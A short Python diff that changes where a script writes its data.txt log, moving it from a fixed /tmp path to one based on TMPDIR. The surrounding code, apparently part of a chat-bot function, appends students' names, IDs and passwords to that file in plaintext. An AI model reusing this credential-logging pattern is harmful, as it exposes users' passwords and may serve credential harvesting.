@@ -134,7 +134,8 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    file_path = '/tmp/data.txt'
+    tmp_dir = os.getenv('TMPDIR', '/tmp')
+    file_path = os.path.join(tmp_dir, 'data.txt')
     with open(file_path, 'a') as file:
         try:
         	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
